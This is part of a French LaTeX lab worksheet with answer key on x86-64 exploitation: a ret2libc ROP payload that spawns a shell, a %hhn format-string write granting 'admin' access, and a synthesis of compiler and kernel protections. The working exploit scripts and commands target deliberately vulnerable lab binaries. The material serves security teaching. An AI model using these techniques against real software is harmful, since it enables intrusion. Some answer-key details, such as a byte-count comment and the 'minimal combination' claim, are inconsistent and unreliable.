+\item[\textbf{4a)}] Recompiler \texttt{stackx64.c} \textbf{sans} \texttt{-z execstack} (NX activé) :
+\begin{lstlisting}[style=GDBStyle]
+gcc -fno-stack-protector -no-pie -g stackx64.c -o stackx64
+\end{lstlisting}
+Relancer l'exploit de la Phase 3. Que se passe-t-il et pourquoi ?
+
+\item[\textbf{4b)}] Trouver l'adresse de \texttt{system()} dans GDB :
+\begin{lstlisting}[style=GDBStyle]
+(gdb) break main
+(gdb) run
+(gdb) print system
+\end{lstlisting}
+
+\item[\textbf{4c)}] Trouver l'adresse de la chaîne \texttt{"/bin/sh"} dans la libc :
+\begin{lstlisting}[style=GDBStyle]
+strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
+\end{lstlisting}
+Puis additionner l'offset trouvé à l'adresse de base de la libc (visible avec \texttt{info proc mappings} dans GDB).
+
+\item[\textbf{4d)}] Trouver un gadget \texttt{pop rdi; ret} dans le binaire ou la libc :
+\begin{lstlisting}[style=GDBStyle]
+ROPgadget --binary stackx64 | grep "pop rdi"
+\end{lstlisting}
+Ou avec \texttt{objdump} :
+\begin{lstlisting}[style=GDBStyle]
+objdump -d stackx64 | grep -A1 "pop.*rdi"
+\end{lstlisting}
+
+\item[\textbf{4e)}] Trouver un gadget \texttt{ret} simple (pour l'alignement) dans le binaire.
+
+\item[\textbf{4f)}] Construire le payload ret2libc complet en Python3 et exécuter l'exploit.
+
+\item[\textbf{4g)}] Remplir le tableau comparatif entre l'injection de shellcode (Phase 3) et le ret2libc (Phase 4) :
+\begin{center}
+\begin{tabular}{lcc}
+\toprule
+\textbf{Critère} & \textbf{Injection shellcode} & \textbf{Return-to-libc} \\
+\midrule
+Code injecté ? & & \\
+Fonctionne avec NX ? & & \\
+Nécessite \texttt{-z execstack} ? & & \\
+Flexibilité de la charge utile & & \\
+Complexité de construction & & \\
+Sensible à l'ASLR de la libc ? & & \\
+\bottomrule
+\end{tabular}
+\end{center}
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{4a)} L'exploit de la Phase 3 provoque un \texttt{SIGSEGV} (segmentation fault). Le processeur tente d'exécuter le shellcode qui se trouve sur la \textbf{pile}, mais la pile est marquée \textbf{non exécutable} (NX activé). Le matériel détecte la violation et le noyau envoie \texttt{SIGSEGV}.
+
+\textbf{4b)} Adresse de \texttt{system()} :
+\begin{lstlisting}[style=GDBStyle]
+(gdb) break main
+(gdb) run
+(gdb) print system
+$1 = {int (const char *)} 0x7ffff7e17290 <__libc_system>
+\end{lstlisting}
+
+\textbf{4c)} Trouver \texttt{"/bin/sh"} :
+\begin{lstlisting}[style=GDBStyle]
+$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
+  1b3d88 /bin/sh
+(gdb) info proc mappings
+          Start Addr           End Addr  ...  objfile
+      0x7ffff7dc0000     0x7ffff7fe8000  ...  libc.so.6
+\end{lstlisting}
+Adresse de \texttt{"/bin/sh"} = \texttt{0x7ffff7dc0000 + 0x1b3d88} = \texttt{0x7ffff7f73d88}
+
+\textbf{4d)} Gadget \texttt{pop rdi; ret} :
+\begin{lstlisting}[style=GDBStyle]
+$ ROPgadget --binary stackx64 | grep "pop rdi"
+0x0000000000401283 : pop rdi ; ret
+\end{lstlisting}
+
+\textbf{4e)} Gadget \texttt{ret} (pour l'alignement) :
+\begin{lstlisting}[style=GDBStyle]
+$ ROPgadget --binary stackx64 | grep ": ret$"
+0x000000000040101a : ret
+\end{lstlisting}
+
+\textbf{4f)} Script Python3 pour l'exploit ret2libc :
+\begin{lstlisting}[style=CStyle,language=Python,title=exploit\_phase4.py]
+import sys
+
+offset = 72
+
+# Addresses (adjust based on your system)
+ret_gadget     = 0x40101a           # ret (alignment)
+pop_rdi_ret    = 0x401283           # pop rdi; ret
+bin_sh_addr    = 0x7ffff7f73d88     # "/bin/sh" in libc
+system_addr    = 0x7ffff7e17290     # system() in libc
+
+def p64(addr):
+    return addr.to_bytes(8, byteorder='little')
+
+payload  = b"A" * offset
+payload += p64(ret_gadget)       # align stack to 16 bytes
+payload += p64(pop_rdi_ret)      # pop rdi; ret
+payload += p64(bin_sh_addr)      # rdi = "/bin/sh"
+payload += p64(system_addr)      # call system("/bin/sh")
+
+sys.stdout.buffer.write(payload)
+\end{lstlisting}
+
+Exécution :
+\begin{lstlisting}[style=GDBStyle]
+$ (python3 exploit_phase4.py ; cat) | ./stackx64
+=== StackX64 - Vulnerable Program ===
+...
+whoami
+etudiant
+\end{lstlisting}
+
+\textbf{4g)} Tableau comparatif rempli :
+\begin{center}
+\begin{tabular}{lcc}
+\toprule
+\textbf{Critère} & \textbf{Injection shellcode} & \textbf{Return-to-libc} \\
+\midrule
+Code injecté ? & Oui (sur la pile) & Non (réutilise la libc) \\
+Fonctionne avec NX ? & Non & Oui \\
+Nécessite \texttt{-z execstack} ? & Oui & Non \\
+Flexibilité de la charge utile & Très élevée & Limitée aux fonctions libc \\
+Complexité de construction & Moyenne & Élevée \\
+Sensible à l'ASLR de la libc ? & Non (code sur la pile) & Oui \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\begin{pointcle}
+\begin{itemize}
+    \item NX empêche l'exécution de code sur la pile, mais \textbf{n'empêche pas} la réutilisation de code existant (ret2libc, ROP).
+    \item L'\textbf{alignement de pile} sur 16 octets est obligatoire sous x86-64 : un gadget \texttt{ret} supplémentaire est souvent nécessaire.
+    \item Ret2libc démontre qu'une seule protection ne suffit pas : il faut une \textbf{défense en profondeur} (NX + ASLR + canaries + ...).
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 5 : Attaque par chaîne de format en écriture (~30 min)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 5 -- Attaque par chaîne de format en écriture \hfill\normalfont\textit{($\sim$30 min)}}
+
+\begin{rappel}
+\textbf{Le spécificateur \texttt{\%n} : de la lecture à l'écriture}
+
+En Phase TD5, vous avez utilisé \texttt{\%x} et \texttt{\%p} pour \textbf{lire} la pile via \texttt{printf(buffer)}. Le spécificateur \texttt{\%n} va plus loin : il \textbf{écrit} le nombre de caractères affichés jusqu'ici à l'adresse pointée par l'argument correspondant.
+
+\medskip
+\textbf{Variantes de \texttt{\%n} :}
+\begin{center}
+\begin{tabular}{lll}
+\toprule
+\textbf{Format} & \textbf{Taille d'écriture} & \textbf{Usage} \\
+\midrule
+\texttt{\%n} & 4 octets (int) & Écriture complète \\
+\texttt{\%hn} & 2 octets (short) & Écriture 16 bits \\
+\texttt{\%hhn} & 1 octet (char) & Écriture 8 bits \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\medskip
+\textbf{Accès direct avec \texttt{\$} :} Le format \texttt{\%k\$hhn} utilise le \textbf{k-ième} argument de la pile pour l'écriture, sans consommer les arguments précédents.
+
+\medskip
+\textbf{Difficulté en 64 bits :} Les adresses x86-64 comme \texttt{0x00000000004040XX} contiennent des \textbf{octets nuls}. Si l'adresse est en début de chaîne, \texttt{printf} s'arrête au premier \texttt{0x00}. Solution : placer l'adresse \textbf{en fin de chaîne} et ajuster l'offset \texttt{k}.
+\end{rappel}
+
+\begin{attention}
+Compiler \texttt{formatx64.c} avec :
+\begin{lstlisting}[style=GDBStyle]
+gcc -fno-stack-protector -no-pie -U_FORTIFY_SOURCE -g formatx64.c -o formatx64
+\end{lstlisting}
+L'option \texttt{-U\_FORTIFY\_SOURCE} désactive la protection qui bloque \texttt{\%n} dans les versions récentes de la glibc.
+\end{attention}
+
+\begin{enumerate}
+\item[\textbf{5a)}] Localiser le buffer sur la pile en utilisant \texttt{\%p} :
+\begin{lstlisting}[style=GDBStyle]
+./formatx64 "AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"
+\end{lstlisting}
+Trouver l'offset \texttt{k} tel que \texttt{\%k\$p} affiche \texttt{0x4141414141414141} (les 8 \texttt{A} = \texttt{0x41}).
+
+\item[\textbf{5b)}] Trouver l'adresse de la variable globale \texttt{is\_admin} avec \texttt{nm} ou \texttt{objdump} :
+\begin{lstlisting}[style=GDBStyle]
+nm formatx64 | grep is_admin
+\end{lstlisting}
+
+\item[\textbf{5c)}] Construire l'exploit \texttt{\%hhn} pour écrire une valeur non nulle dans \texttt{is\_admin}. La stratégie est :
+\begin{enumerate}
+    \item Placer l'adresse de \texttt{is\_admin} en fin de payload (après les spécificateurs de format)
+    \item Utiliser du padding pour ajuster le nombre de caractères affichés
+    \item Utiliser \texttt{\%hhn} avec l'offset approprié pour écrire dans \texttt{is\_admin}
+\end{enumerate}
+
+\item[\textbf{5d)}] Exécuter l'exploit et vérifier que le message \texttt{"Admin access granted!"} s'affiche.
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{5a)} Localisation du buffer sur la pile :
+\begin{lstlisting}[style=GDBStyle]
+$ ./formatx64 "AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p"
+=== FormatX64 - Format String Vulnerability ===
+
+[DEBUG] is_admin is at address: 0x404040
+[DEBUG] is_admin value (before): 0
+
+AAAAAAAA.0x7fffffffdc30.0x7ffff7f9a2a0.(nil).0x7fffffffdd40.
+0x7ffff7ffdaa0.0x4141414141414141.0x2e70252e70252e2e.0x252e70252e70252e
+\end{lstlisting}
+
+On voit \texttt{0x4141414141414141} en position \textbf{6}. Donc \texttt{k = 6} :
+\begin{lstlisting}[style=GDBStyle]
+$ ./formatx64 $(python3 -c "print('AAAAAAAA%6\$p')")
+... 0x4141414141414141 ...
+\end{lstlisting}
+
+\textbf{5b)} Adresse de \texttt{is\_admin} :
+\begin{lstlisting}[style=GDBStyle]
+$ nm formatx64 | grep is_admin
+0000000000404040 B is_admin
+\end{lstlisting}
+L'adresse est \texttt{0x404040}.
+
+\textbf{5c)} Construction de l'exploit. L'adresse \texttt{0x404040} contient des null bytes (\texttt{0x00 0x00 0x40 0x40 0x40 0x00 0x00 0x00}). On la place en \textbf{fin de chaîne}. On doit calculer la position sur la pile de cette adresse.
+
+Le buffer commence à l'offset 6 sur la pile. Si notre chaîne de format fait 16 octets avant l'adresse (2 quadwords), l'adresse sera à l'offset $6 + 2 = 8$.
+
+Script Python3 :
+\begin{lstlisting}[style=CStyle,language=Python,title=exploit\_phase5.py]
+import sys, struct
+
+is_admin_addr = 0x404040
+
+# Build the format string:
+# We need %hhn to write 1 byte to is_admin
+# The address is placed at the end (after format specifiers)
+# to avoid null byte truncation.
+
+# Strategy: write 1 byte (any non-zero value) to is_admin
+# Padding: adjust character count to desired value
+# The address will be at offset k on the stack
+
+# Format string: "<padding>%<offset>$hhn" + address
+# The padding ensures we have printed a non-zero number of chars
+# before %hhn writes that count to the target address
+
+# Our buffer starts at stack offset 6
+# The format string part: "AA%8$hhnBBB" = 11 bytes + 5 padding = 16 bytes
+# Then the address at offset 8 (= 6 + 16/8 = 6 + 2)
+
+fmt = b"AA%8$hhnBBBBB"  # 13 bytes, pad to 16
+fmt = fmt.ljust(16, b"C")
+payload = fmt + struct.pack("<Q", is_admin_addr)
+
+sys.stdout.buffer.write(payload)
+\end{lstlisting}
+
+Exécution :
+\begin{lstlisting}[style=GDBStyle]
+$ ./formatx64 $(python3 exploit_phase5.py)
+=== FormatX64 - Format String Vulnerability ===
+
+[DEBUG] is_admin is at address: 0x404040
+[DEBUG] is_admin value (before): 0
+
+AA@@BBBBB...
+
+[DEBUG] is_admin value (after): 2
+
+=============================================
+  Admin access granted!
+=============================================
+\end{lstlisting}
+
+\textbf{5d)} Le message \texttt{"Admin access granted!"} s'affiche car \texttt{is\_admin} vaut maintenant 2 (le nombre de caractères \texttt{"AA"} affichés avant le \texttt{\%hhn}), ce qui est non nul $\Rightarrow$ la condition \texttt{if(is\_admin)} est vraie.
+
+\begin{attention}
+L'offset exact dépend de la taille de la chaîne de format et de l'alignement sur la pile. Il faut souvent ajuster par essais successifs. Utiliser GDB pour vérifier la position de l'adresse sur la pile.
+\end{attention}
+
+\begin{pointcle}
+\begin{itemize}
+    \item \texttt{\%n} transforme une vulnérabilité de \textbf{lecture} (format string classique) en vulnérabilité d'\textbf{écriture arbitraire}.
+    \item En 64 bits, les adresses contiennent des null bytes $\Rightarrow$ on place l'adresse \textbf{en fin de chaîne} pour éviter la troncation.
+    \item \texttt{\%hhn} (écriture 1 octet) est plus facile à contrôler que \texttt{\%n} (4 octets) car il suffit d'afficher $\leq 255$ caractères.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 6 : Synthèse et mécanismes de défense (~25 min)
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 6 -- Synthèse et mécanismes de défense \hfill\normalfont\textit{($\sim$25 min)}}
+
+\begin{rappel}
+\textbf{Défense en profondeur (\textit{defense in depth}) :}
+
+Aucune protection individuelle ne bloque toutes les attaques. La sécurité repose sur \textbf{plusieurs couches} complémentaires :
+
+\begin{center}
+\begin{tabular}{llll}
+\toprule
+\textbf{Mécanisme} & \textbf{Principe} & \textbf{Flag GCC} \\
+\midrule
+Stack canaries & Valeur sentinelle avant l'adresse de retour & \texttt{-fstack-protector} \\
+NX / DEP & Pile non exécutable & (activé par défaut) \\
+ASLR & Randomisation des adresses mémoire & (noyau) \\
+PIE & Code exécutable à adresse aléatoire & \texttt{-pie} \\
+Full RELRO & GOT en lecture seule & \texttt{-Wl,-z,relro,-z,now} \\
+\bottomrule
+\end{tabular}
+\end{center}
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{6a)}] Pour chacun des 5 mécanismes de défense (stack canaries, NX, ASLR, PIE, Full RELRO), décrire en 2-3 phrases :
+\begin{itemize}
+    \item Son \textbf{principe} de fonctionnement
+    \item Quelle(s) \textbf{attaque(s)} il bloque
+    \item Le \textbf{flag} de compilation ou de système pour l'activer/désactiver
+\end{itemize}
+
+\item[\textbf{6b)}] Remplir la matrice suivante (5 protections $\times$ 4 attaques). Pour chaque case, indiquer : \textbf{BLOQUE}, \textbf{ne bloque pas}, ou \textbf{partiellement} (avec justification).
+
+\begin{center}
+\begin{tabular}{l|c|c|c|c}
+\toprule
+& \textbf{Overflow} & \textbf{Shellcode} & \textbf{Ret2libc} & \textbf{Format} \\
+& \textbf{$\to$ secret()} & \textbf{injection} & & \textbf{string \%n} \\
+\midrule
+\textbf{Stack canaries} & & & & \\
+\midrule
+\textbf{NX / DEP} & & & & \\
+\midrule
+\textbf{ASLR} & & & & \\
+\midrule
+\textbf{PIE} & & & & \\
+\midrule
+\textbf{Full RELRO} & & & & \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\item[\textbf{6c)}] Quelle \textbf{combinaison minimale} de protections permet de bloquer les 4 types d'attaques vues dans ce TD ?
+
+\item[\textbf{6d)}] \textbf{Réflexion :} Un attaquant avancé dispose de techniques comme les \textit{fuites d'information} (information leaks) pour contourner l'ASLR et les \textit{chaînes ROP} complexes pour contourner NX. Pourquoi la \textbf{défense en profondeur} reste-t-elle nécessaire malgré ces contournements ?
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{6a)} Description des 5 mécanismes :
+
+\begin{enumerate}
+\item \textbf{Stack canaries} : Une valeur aléatoire (``canari'') est placée entre les variables locales et l'adresse de retour sauvegardée. Avant le \texttt{ret}, le compilateur vérifie que cette valeur n'a pas été modifiée. \textbf{Bloque} les débordements de tampon qui écrasent l'adresse de retour (l'attaquant doit écraser le canari pour atteindre l'adresse de retour, ce qui déclenche l'arrêt du programme). \textbf{Flags} : \texttt{-fstack-protector} / \texttt{-fno-stack-protector}.
+
+\item \textbf{NX / DEP} : Les pages mémoire sont marquées avec un bit NX (No-eXecute). La pile, le tas et les segments de données sont marqués non exécutables. Le processeur refuse d'exécuter du code situé dans ces zones. \textbf{Bloque} l'injection de shellcode sur la pile ou le tas. \textbf{Flags} : \texttt{-z execstack} (désactive) / activé par défaut.
+
+\item \textbf{ASLR} (\textit{Address Space Layout Randomization}) : Le noyau randomise les adresses de la pile, du tas, de la libc et des bibliothèques partagées à chaque exécution. L'attaquant ne peut plus prédire les adresses. \textbf{Bloque} (partiellement) les attaques nécessitant des adresses connues (shellcode injection, ret2libc). \textbf{Commande} : \texttt{sysctl kernel.randomize\_va\_space=2} (activer) / \texttt{=0} (désactiver).
+
+\item \textbf{PIE} (\textit{Position-Independent Executable}) : Le code de l'exécutable lui-même est compilé pour être chargé à une adresse aléatoire (en complément de l'ASLR qui randomise les bibliothèques). L'attaquant ne peut plus compter sur des adresses fixes dans le binaire (gadgets, fonctions). \textbf{Flags} : \texttt{-pie} / \texttt{-no-pie}.
+
+\item \textbf{Full RELRO} (\textit{Relocation Read-Only}) : La GOT (\textit{Global Offset Table}), qui contient les adresses des fonctions de bibliothèques partagées, est résolue au chargement et rendue \textbf{en lecture seule}. Cela empêche la réécriture de la GOT (technique d'attaque avancée). \textbf{Flags} : \texttt{-Wl,-z,relro,-z,now} (full) / \texttt{-Wl,-z,norelro} (désactiver).
+\end{enumerate}
+
+\textbf{6b)} Matrice protection $\times$ attaque :
+
+\begin{center}
+\begin{tabular}{l|c|c|c|c}
+\toprule
+& \textbf{Overflow} & \textbf{Shellcode} & \textbf{Ret2libc} & \textbf{Format} \\
+& \textbf{$\to$ secret()} & \textbf{injection} & & \textbf{string \%n} \\
+\midrule
+\textbf{Stack canaries} & BLOQUE & BLOQUE & BLOQUE & ne bloque pas \\
+\midrule
+\textbf{NX / DEP} & ne bloque pas & BLOQUE & ne bloque pas & ne bloque pas \\
+\midrule
+\textbf{ASLR} & ne bloque pas & partiellement & BLOQUE & partiellement \\
+\midrule
+\textbf{PIE} & partiellement & partiellement & partiellement & partiellement \\
+\midrule
+\textbf{Full RELRO} & ne bloque pas & ne bloque pas & ne bloque pas & partiellement \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\textbf{Justifications des ``partiellement''} :
+\begin{itemize}
+    \item \textbf{ASLR / shellcode injection} : l'adresse de la pile est randomisée, mais un NOP sled très large pourrait compenser (attaque par bruteforce). C'est impraticable en 64 bits (espace d'adressage trop grand) mais théoriquement possible.
+    \item \textbf{ASLR / format string} : les adresses de la pile changent, mais une fuite d'information (\texttt{\%p}) peut révéler les adresses courantes.
+    \item \textbf{PIE} : randomise les adresses du binaire (gadgets, fonctions comme \texttt{secret\_function}), mais une fuite d'information peut contourner la protection.
+    \item \textbf{Full RELRO / format string} : empêche la réécriture de la GOT mais pas d'autres cibles en mémoire.
+\end{itemize}
+
+\textbf{6c)} Combinaison minimale :
+
+\textbf{Stack canaries + NX + ASLR} bloquent les 4 attaques :
+\begin{itemize}
+    \item Overflow $\to$ secret() : bloqué par \textbf{stack canaries} (l'écrasement du canari est détecté)
+    \item Shellcode injection : bloqué par \textbf{NX} (pile non exécutable) et \textbf{stack canaries}
+    \item Ret2libc : bloqué par \textbf{ASLR} (adresses de la libc imprévisibles) et \textbf{stack canaries}
+    \item Format string \texttt{\%n} : l'écriture est plus difficile avec \textbf{ASLR} (adresses cibles inconnues), mais les canaries ne protègent pas directement. Cependant, avec ASLR + PIE, les adresses des variables globales sont aussi randomisées.
+\end{itemize}
+
+En pratique, la combinaison \textbf{Stack canaries + NX + ASLR + PIE} offre une couverture robuste.
+
+\textbf{6d)} La défense en profondeur reste nécessaire car :
+\begin{itemize}
+    \item Chaque protection individuelle a des \textbf{limites connues} : les fuites d'information (\texttt{\%p}, timing side-channels) contournent l'ASLR, les chaînes ROP contournent NX, les écritures partielles contournent les canaries.
+    \item L'attaquant doit \textbf{enchaîner plusieurs contournements} quand plusieurs protections sont actives. La probabilité de succès diminue multiplicativement.
+    \item Les nouvelles vulnérabilités et techniques d'exploitation sont découvertes régulièrement. Une protection considérée comme robuste aujourd'hui pourrait être contournée demain.
+    \item Les compilateurs modernes (\texttt{gcc}, \texttt{clang}) activent par défaut \textbf{toutes} ces protections (stack canaries, NX, ASLR, PIE, partial RELRO). Le développeur doit explicitement les désactiver (comme dans ce TD) pour permettre les attaques.
+\end{itemize}
+
+\begin{pointcle}
+\begin{itemize}
+    \item \textbf{Aucune protection seule ne suffit} : stack canaries ne bloquent pas les format strings, NX ne bloque pas ret2libc, ASLR est contournable par les fuites d'information.
+    \item La \textbf{défense en profondeur} force l'attaquant à contourner plusieurs mécanismes simultanément, augmentant considérablement la difficulté.
+    \item Les compilateurs modernes activent \textbf{toutes} ces protections par défaut. Dans ce TD, nous les avons désactivées une par une pour comprendre leur rôle.
+    \item La meilleure défense reste d'\textbf{écrire du code sûr} : utiliser \texttt{fgets()} au lieu de \texttt{gets()}, \texttt{snprintf()} au lieu de \texttt{sprintf()}, et toujours valider les entrées.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+\end{exercice}
+
+\end{document}
